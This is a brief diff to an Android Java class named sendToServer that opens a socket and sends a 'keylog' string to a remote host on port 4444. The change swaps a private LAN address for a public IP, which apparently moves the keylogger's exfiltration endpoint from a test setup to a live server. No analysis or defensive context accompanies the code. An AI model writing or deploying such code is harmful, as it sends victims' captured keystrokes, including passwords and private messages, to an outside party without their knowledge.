@@ -22,7 +22,7 @@ public class sendToServer extends AsyncTask<Void, Void, Void> {
     @Override
     protected Void doInBackground(Void... voids) {
         try {
-            s = new Socket("192.168.117.102", 4444);
+            s = new Socket("20.239.89.117", 4444);
             dataOutputStream = new DataOutputStream(s.getOutputStream());
             dataOutputStream.writeUTF(keylog);
             dataOutputStream.flush();
